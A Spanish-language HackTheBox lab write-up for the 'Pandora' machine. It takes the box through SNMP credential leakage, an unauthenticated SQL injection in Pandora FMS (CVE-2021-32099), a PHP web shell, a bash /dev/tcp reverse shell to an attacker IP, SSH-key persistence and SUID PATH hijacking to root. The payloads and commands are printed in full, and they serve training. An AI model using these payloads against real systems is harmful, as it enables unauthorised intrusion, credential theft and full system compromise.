---
title: Pandora Writeup - HackTheBox
date: 2024-08-20
categories: [WriteUps, HackTheBox]
tags: [Linux, Easy, HackTheBox]
img_path: /assets/img/htb/pandora/
image: /assets/img/htb/pandora/pandora.png
---

Explotamos un servicio SNMP expuesto para obtener credenciales SSH y acceder al sistema. Luego, utilizamos una inyección SQL en Pandora FMS para obtener una sesión de administrador. Subimos un script PHP malicioso para ejecutar comandos y acceder a otro usuario. Finalmente, explotamos un binario SUID para escalar privilegios a root y tomar control total de la máquina.
## Reconocimiento
---
Realizamos un escaneo de puertos en la máquina objetivo utilizando `nmap` para identificar los servicios en ejecución.

```bash
nmap -p- --open -sS -Pn -n --min-rate 5000 -vvv 10.10.11.136 -oG allPorts
_______________________________________________________________________
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```
---
Los resultados indicaron que hay dos puertos abiertos: **22 (SSH)** y **80 (HTTP)**. A continuación, realizamos un escaneo más detallado para identificar las versiones de los servicios y posibles vulnerabilidades.

```bash
nmap -sCV -p22,80 10.10.11.136 -oN targeted
_______________________________________________________________________
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Play | Landing
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
---
Luego, utilizamos `whatweb` para obtener información adicional sobre el servidor web.

```bash
whatweb http://10.10.11.136
_______________________________________________________________________
http://10.10.11.136 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], Email[contact@panda.htb,example@yourmail.com,support@panda.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.136], Open-Graph-Protocol[website], Script, Title[Play | Landing], probably WordPress, X-UA-Compatible[IE=edge]
```
---
El análisis reveló la presencia del dominio asociado `http://panda.htb`. Para acceder correctamente al sitio web, actualizamos nuestro archivo `/etc/hosts` añadiendo la IP y el dominio correspondiente.

```bash
echo "10.10.11.136\tpanda.htb" | tee -a /etc/hosts
```
---
Accedemos al sitio web en `http://panda.htb`.

![pandora-1](/assets/img/htb/pandora/pandora-1.png)

---
A primera vista, no encontramos nada relevante en la web. Decidimos realizar un escaneo de puertos UDP utilizando `nmap`.

```bash
nmap -sU --top-ports 100 --open -T5 -v -n 10.10.11.136
_______________________________________________________________________
PORT    STATE SERVICE
161/udp open  snmp
```
## Enumeración
---
El escaneo reveló que el puerto **161/udp** (SNMP) estaba abierto, por lo que procedimos a enumerar el servicio SNMP utilizando `snmpbulkwalk`.

```bash
snmpbulkwalk -c public -v2c 10.10.11.136 > snmp_enum.txt
```
---
Revisamos el contenido del archivo generado en busca de información expuesta.

```bash
cat snmp_enum.txt
_______________________________________________________________________
iso.3.6.1.2.1.1.1.0 = STRING: "Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (272821) 0:45:28.21
iso.3.6.1.2.1.1.4.0 = STRING: "Daniel"
iso.3.6.1.2.1.1.5.0 = STRING: "pandora"
iso.3.6.1.2.1.1.6.0 = STRING: "Mississippi"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (6) 0:00:00.06
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
```
---
Identificamos un posible usuario llamado "Daniel". Dado que el archivo resultante contenía información extensa con 6962 líneas, decidimos buscar específicamente palabras que contuvieran "Daniel".

```bash
cat snmp_enum.txt | grep "daniel" -i
_______________________________________________________________________
iso.3.6.1.2.1.1.4.0 = STRING: "Daniel"
iso.3.6.1.2.1.25.4.2.1.5.823 = STRING: "-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'"
iso.3.6.1.2.1.25.4.2.1.5.1092 = STRING: "-u daniel -p HotelBabylon23"
```
---
Encontramos la contraseña del usuario `daniel`, la cual es `HotelBabylon23`. Intentamos conectarnos al servicio SSH utilizando estas credenciales.

```bash
ssh daniel@10.10.11.136
daniel@10.10.11.136's password: HotelBabylon23
_______________________________________________________________________
daniel@pandora:~$ 
```
---
Logramos conectarnos y establecemos un entorno de terminal adecuado.

```bash
export TERM=xterm
```
---
Enumeramos los usuarios del sistema para identificar posibles objetivos para escalar privilegios. Generalmente, los shells de los usuarios serán `/bin/sh` o `/bin/bash`.

```bash
daniel@pandora:~$ cat /etc/passwd | grep -E '(/bin/sh|/bin/bash)$'
_______________________________________________________________________
root:x:0:0:root:/root:/bin/bash
matt:x:1000:1000:matt:/home/matt:/bin/bash
daniel:x:1001:1001::/home/daniel:/bin/bash
```
---
Identificamos un segundo usuario llamado `matt`. Revisamos las configuraciones de Apache para buscar más pistas.

```bash
daniel@pandora:~$ ls /etc/apache2/sites-enabled/
_______________________________________________________________________
000-default.conf  pandora.conf
```
---
El archivo `pandora.conf` es de interés, por lo que lo examinamos.

```bash
daniel@pandora:~$ cat /etc/apache2/sites-enabled/pandora.conf
_______________________________________________________________________
<VirtualHost localhost:80>
  ServerAdmin admin@panda.htb
  ServerName pandora.panda.htb
  DocumentRoot /var/www/pandora
  AssignUserID matt matt
  <Directory /var/www/pandora>
    AllowOverride All
  </Directory>
  ErrorLog /var/log/apache2/error.log
  CustomLog /var/log/apache2/access.log combined
</VirtualHost>
```
---
El archivo de configuración reveló que el servidor escucha en `localhost` bajo el dominio `pandora.panda.htb`, y se ejecuta con los permisos del usuario `matt`. Actualizamos nuestro archivo `/etc/hosts` para incluir este subdominio.

```bash
sed -i '$ s/$/ pandora.panda.htb/' /etc/hosts
```
---
Realizamos un `curl` a localhost para ver si nos redirige a algún recurso interesante.

```bash
daniel@pandora:~$ curl localhost
_______________________________________________________________________
<meta HTTP-EQUIV="REFRESH" content="0; url=/pandora_console/">
```
---
Esto sugiere que la URL `http://localhost/pandora_console/` está activa y accesible internamente en la máquina objetivo. Para poder interactuar con este recurso desde nuestra máquina atacante, debemos configurar un port forwarding, que nos permitirá redirigir el tráfico de nuestra máquina a la máquina objetivo a través de SSH.

```bash
ssh daniel@10.10.11.136 -L 80:127.0.0.1:80
daniel@10.10.11.136's password: HotelBabylon23
_______________________________________________________________________
daniel@pandora:~$ 
```
---
El comando anterior establece una conexión SSH al servidor como el usuario `daniel` y, al mismo tiempo, redirige el puerto 80 de nuestra máquina local al puerto 80 del localhost de la máquina remota (10.10.11.136). Esto significa que cualquier tráfico que enviemos a `http://localhost` en nuestro navegador, será reenviado a `http://127.0.0.1:80` en la máquina remota, permitiéndonos acceder al recurso que antes no era accesible externamente. Ahora, abrimos nuestro navegador y visitamos `http://localhost`.

![pandora-2](/assets/img/htb/pandora/pandora-2.png)

## Explotación
---
Al cargar `http://localhost`, la página nos redirige automáticamente a `http://localhost/pandora_console/`, confirmando que hemos configurado correctamente el port forwarding y que ahora podemos acceder a la interfaz de Pandora FMS desde nuestra máquina. Una vez dentro, observamos que la aplicación web es Pandora FMS, específicamente la versión v7.0NG.742_FIX_PERL2020. Pandora FMS es una solución de monitorización para sistemas y aplicaciones. Después de investigar las vulnerabilidades conocidas para esta versión en particular, encontramos que es vulnerable a una inyección SQL sin autenticación (CVE-2021-32099). Siguiendo esta [guía de vulnerabilidad](https://www.sonarsource.com/blog/pandora-fms-742-critical-code-vulnerabilities-explained/).

![pandora-3](/assets/img/htb/pandora/pandora-3.png)

---
Esta vulnerabilidad reside en el archivo `/include/chart_generator.php`, donde el parámetro `session_id` no está debidamente sanitizado. Esto nos permite inyectar código SQL malicioso directamente en las consultas que realiza la base de datos. Usamos `=1'`.

![pandora-4](/assets/img/htb/pandora/pandora-4.png)

---
Al acceder a la URL con la inyección, observamos que el servidor responde con un error, indicando que nuestra inyección SQL está siendo procesada. Este es un indicio claro de que la vulnerabilidad existe y puede ser explotada. Después de varias pruebas e iteraciones, logramos construir una inyección SQL que extrae la cookie de sesión del administrador. Esta cookie nos permitirá autenticarnos como administrador sin necesidad de una contraseña.

```bash
http://localhost/pandora_console/include/chart_generator.php?session_id=%27%20union%20SELECT%201,2,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20--%20SgGO%27
```

![pandora-5](/assets/img/htb/pandora/pandora-5.png)

---
Ahora que hemos obtenido la cookie de sesión, se introduce en nuestro navegador para suplantar la sesión del administrador. Al recargar la página `http://localhost/pandora_console/`, vemos que ahora tenemos acceso al panel de administración de Pandora FMS como si fuéramos el administrador legítimo.

![pandora-6](/assets/img/htb/pandora/pandora-6.png)

---
Desde el panel de administración, navegamos a la sección "Admin tools" y luego a "File Manager". Esta sección nos permite cargar archivos directamente en el servidor. Aprovecharemos esta funcionalidad para subir un archivo PHP que nos dará la capacidad de ejecutar comandos arbitrarios en el servidor.

![pandora-7](/assets/img/htb/pandora/pandora-7.png)

---
Creamos un archivo PHP llamado `cmd.php` que contendrá el siguiente código. Este script PHP tomará el parámetro `cmd` de la URL y lo ejecutará como un comando en el servidor, devolviendo la salida al navegador.

```bash
echo '<?php echo "<pre>" . shell_exec($_REQUEST["cmd"]) . "</pre>"; ?>' > cmd.php
```
---
Subimos este archivo utilizando el "File Manager" del panel de Pandora FMS.

![pandora-8](/assets/img/htb/pandora/pandora-8.png)

---
Una vez subido, el archivo estará accesible en la ruta `http://localhost/pandora_console/images/cmd.php`. Accedemos para ver si se ejecuta correctamente y si obtenemos la salida del comando ifconfig. Como esperábamos, el comando se ejecuta y vemos la configuración de red del servidor en nuestro navegador.

![pandora-9](/assets/img/htb/pandora/pandora-9.png)

---
Con la capacidad de ejecutar comandos en el servidor, podemos proceder a establecer una reverse shell para obtener acceso interactivo a la máquina. Configuramos un listener en nuestra máquina atacante en el puerto **443** utilizando `netcat`.

```bash
nc -lvnp 443
_______________________________________________________________________
listening on [any] 443 ...
```
---
Luego, enviamos el comando para establecer la reverse shell desde el servidor hacia nuestra máquina atacante.

```bash
http://localhost/pandora_console/images/cmd.php?cmd=bash -c "bash -i >%26 /dev/tcp/10.10.16.9/443 0>%261"
```
---
El servidor ejecuta el comando y establecemos una conexión exitosa con la máquina objetivo como el usuario `matt`.

```bash
nc -lvnp 443
listening on [any] 443 ...
_______________________________________________________________________
connect to [10.10.16.9] from (UNKNOWN) [10.10.11.136] 32842
matt@pandora:/var/www/pandora/pandora_console/images$ 
```
---
Una vez que tenemos acceso a la shell como `matt`, estabilizamos la TTY para poder trabajar de manera más cómoda y ejecutar comandos interactivos sin problemas.

```bash
script /dev/null -c bash
# Presionamos "Control + Z"
stty raw -echo; fg
reset xterm
export TERM=xterm SHELL=bash
stty rows 25 columns 127
```
## Escalada de Privilegios
---
Ahora que tenemos una shell estable, procedemos a leer la flag `user.txt` que se encuentra en el directorio home de `matt` para confirmar nuestro acceso.

```bash
matt@pandora:/var/www/pandora/pandora_console/images$ cat /home/matt/user.txt 
_______________________________________________________________________
aa04601be5c414******************
```
---
Para continuar con la escalada de privilegios, comenzamos buscando binarios en el sistema que tengan el bit SUID activado. Este bit permite que un binario se ejecute con los privilegios de su propietario, que en muchos casos es `root`. Encontrar un binario con SUID puede darnos una vía para ejecutar comandos con privilegios elevados.

```bash
www-data@48e833747d49:/$ find / -perm -4000 2>/dev/null | xargs ls -l
_______________________________________________________________________
-rwsr-sr-x 1 daemon daemon      55560 Nov 12  2018 /usr/bin/at
-rwsr-xr-x 1 root   root        85064 Jul 14  2021 /usr/bin/chfn
-rwsr-xr-x 1 root   root        53040 Jul 14  2021 /usr/bin/chsh
-rwsr-xr-x 1 root   root        39144 Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root   root        88464 Jul 14  2021 /usr/bin/gpasswd
-rwsr-xr-x 1 root   root        55528 Jul 21  2020 /usr/bin/mount
-rwsr-xr-x 1 root   root        44784 Jul 14  2021 /usr/bin/newgrp
-rwsr-x--- 1 root   matt        16816 Dec  3  2021 /usr/bin/pandora_backup
-rwsr-xr-x 1 root   root        68208 Jul 14  2021 /usr/bin/passwd
-rwsr-xr-x 1 root   root        31032 May 26  2021 /usr/bin/pkexec
-rwsr-xr-x 1 root   root        67816 Jul 21  2020 /usr/bin/su
-rwsr-xr-x 1 root   root       166056 Jan 19  2021 /usr/bin/sudo
-rwsr-xr-x 1 root   root        39144 Jul 21  2020 /usr/bin/umount
-rwsr-xr-- 1 root   messagebus  51344 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root        14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root   root       473576 Jul 23  2021 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root        22840 May 26  2021 /usr/lib/policykit-1/polkit-agent-helper-1
```
---
El comando anterior revela un binario interesante llamado `pandora_backup`, que tiene el bit SUID activado y es propiedad de `root`. Decidimos ejecutarlo para ver qué hace.

```bash
matt@pandora:/$ /usr/bin/pandora_backup
_______________________________________________________________________
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
tar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied
tar: Error is not recoverable: exiting now
Backup failed!
Check your permissions!
```
---
El binario intenta crear un archivo en `/root/.backup/`, pero falla debido a permisos insuficientes. Este comportamiento es interesante porque sugiere que podríamos explotar esta funcionalidad para lograr una escalada de privilegios. Intentamos listar los comandos que `matt` puede ejecutar con `sudo`, pero obtenemos un error que indica que no tenemos los permisos necesarios para usar `sudo`.

```bash
matt@pandora:/$ sudo -l
_______________________________________________________________________
sudo: PERM_ROOT: setresuid(0, -1, -1): Operation not permitted
sudo: unable to initialize policy plugin
```
---
El intento de usar `sudo` también falló con un error relacionado con permisos, indicando que no se podía inicializar el plugin de política de `sudo`, exploramos otras posibles vías de escalada de privilegios. Generamos un par de claves SSH en la máquina objetivo para asegurarnos un acceso persistente y seguro.

```bash
matt@pandora:/home/matt$ ssh-keygen
_______________________________________________________________________
Generating public/private rsa key pair.
Enter file in which to save the key (/home/matt/.ssh/id_rsa): 
Created directory '/home/matt/.ssh'.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/matt/.ssh/id_rsa
Your public key has been saved in /home/matt/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:olaw8bfNRuuwJ+25wZ++HO4lS2f0fDQzx4F7WMa0+fg matt@pandora
The key's randomart image is:
+---[RSA 3072]----+
|               . |
|              + o|
|    o        . B |
|     =        =oo|
|    . + S .  oo==|
|     o o * . ..==|
|    o   o.B + + E|
|   .    .=oB O  .|
|        .+=+X.   |
+----[SHA256]-----+
```
---
Encontramos el par de claves SSH creados en el directorio `.ssh`. 

```bash
matt@pandora:/home/matt$ cd .ssh
matt@pandora:/home/matt/.ssh$ ls
_______________________________________________________________________
id_rsa  id_rsa.pub
```
---
Copiamos la clave pública al archivo `authorized_keys` de `matt` y ajustamos los permisos para garantizar que solo él pueda leer y escribir en este archivo.

```bash
matt@pandora:/home/matt/.ssh$ cat id_rsa.pub > authorized_keys
matt@pandora:/home/matt/.ssh$ chmod 600 authorized_keys
matt@pandora:/home/matt/.ssh$ ls -l
_______________________________________________________________________
total 12
-rw------- 1 matt matt  566 Aug 18 23:51 authorized_keys
-rw------- 1 matt matt 2602 Aug 18 23:48 id_rsa
-rw-r--r-- 1 matt matt  566 Aug 18 23:48 id_rsa.pub
```
---
Visualizamos el contenido de la clave privada `id_rsa` y la copiamos a nuestra máquina atacante.

```bash
matt@pandora:/home/matt/.ssh$ cat id_rsa
_______________________________________________________________________
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
**********************************************************************
**********************************************************************
**********************************************************************
```
---
En nuestra máquina atacante, pegamos la clave en un archivo llamado `id_rsa` y ajustamos los permisos para no tener problemas con el nivel de permisos.

```bash
nvim id_rsa
chmod 600 id_rsa
```
---
Con la clave privada, nos conectamos por SSH nuevamente como `matt`, ahora sin necesidad de proporcionar una contraseña.

```bash
ssh -i id_rsa matt@10.10.11.136
_______________________________________________________________________
matt@pandora:~$ 
```
---
Establecemos el entorno de terminal adecuado con el siguiente comando

```bash
export TERM=xterm
```
---
Probamos si podemos ejecutar `sudo -l` para ver si ya no tenemos problemas.

```bash
matt@pandora:/$ sudo -l
_______________________________________________________________________
[sudo] password for matt: 
```
---
Dado que ya no tenemos restricciones. Continuamos la escalada de privilegios. Recordemos que el binario `pandora_backup` tiene el bit SUID activado y está intentando crear un archivo en `/root/.backup/` sin éxito debido a permisos de directorio. Podemos intentar explotar esta situación para obtener acceso root.

```bash
matt@pandora:/$ /usr/bin/pandora_backup
_______________________________________________________________________
tar: Removing leading `/' from member names
/var/www/pandora/pandora_console/AUTHORS
tar: Removing leading `/' from hard link targets
/var/www/pandora/pandora_console/COPYING
/var/www/pandora/pandora_console/DB_Dockerfile
/var/www/pandora/pandora_console/DEBIAN/
/var/www/pandora/pandora_console/DEBIAN/md5sums
/var/www/pandora/pandora_console/DEBIAN/conffiles
/var/www/pandora/pandora_console/DEBIAN/control
/var/www/pandora/pandora_console/DEBIAN/make_deb_package.sh
/var/www/pandora/pandora_console/DEBIAN/postinst
/var/www/pandora/pandora_console/Dockerfile
```
---
Este comando genera 5492 líneas, y lo que indica que está tratando de empaquetar una gran cantidad de archivos usando `tar`. Para entender mejor este binario, usamos el comando `file`.

```bash
matt@pandora:/$ file /usr/bin/pandora_backup
_______________________________________________________________________
/usr/bin/pandora_backup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7174c3b04737ad11254839c20c8dab66fce55af8, for GNU/Linux 3.2.0, not stripped
```
---
Vemos que es un binario compilado, lo que significa que está precompilado y no podemos simplemente ver su código fuente. Para obtener más información sobre lo que hace internamente, utilizamos `ltrace` para rastrear las llamadas a funciones de la librería.

```bash
matt@pandora:/$ ltrace /usr/bin/pandora_backup
_______________________________________________________________________
getuid()                                                                      = 1000
geteuid()                                                                     = 1000
setreuid(1000, 1000)                                                          = 0
puts("PandoraFMS Backup Utility"PandoraFMS Backup Utility
)                                             = 26
puts("Now attempting to backup Pandora"...Now attempting to backup PandoraFMS client
)                                   = 43
system("tar -cvf /root/.backup/pandora-b"...tar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied
tar: Error is not recoverable: exiting now
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                        = 512
puts("Backup failed!\nCheck your permis"...Backup failed!
Check your permissions!
)                                  = 39
+++ exited (status 1) +++
```
---
Aquí observamos que el comando `tar` se ejecuta sin una ruta absoluta, lo que significa que el sistema buscará el binario `tar` en los directorios especificados por la variable `PATH`. Esto abre la puerta a un ataque conocido como PATH Hijacking. La idea es crear un archivo `tar` malicioso en un directorio al que tengamos acceso, como `/tmp`, que en lugar de comprimir archivos, ejecute un shell con privilegios elevados. Primero, creamos un archivo llamado `tar` en `/tmp` que contiene una simple ejecución de `bash`:

```bash
matt@pandora:/$ cd temp && echo "/usr/bin/bash" > tar && chmod +x tar
```
---
Luego, modificamos la variable `PATH` para que busque primero en `/tmp`, asegurándonos de que nuestro script malicioso se ejecute en lugar del comando legítimo `tar`.

```bash
matt@pandora:/tmp$ echo $PATH 
_______________________________________________________________________
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```
---
A continuación, ajustamos el `PATH` y verificamos que el cambio se haya aplicado correctamente.

```bash
matt@pandora:/tmp$ export PATH=/tmp:$PATH
matt@pandora:/tmp$ echo $PATH 
_______________________________________________________________________
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```
---
Con el `PATH` modificado, cuando ejecutamos nuevamente `pandora_backup`, el sistema busca el comando `tar` en `/tmp` y ejecuta nuestro script malicioso, otorgándonos una shell como root.

```bash
matt@pandora:/tmp$ /usr/bin/pandora_backup
_______________________________________________________________________
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
root@pandora:/tmp# 
```
---
Finalmente logramos ser root y accedemos al archivo `root.txt` para leer la flag.

```bash
root@pandora:/tmp# cat /root/root.txt
_______________________________________________________________________
405172f31e80cc******************
```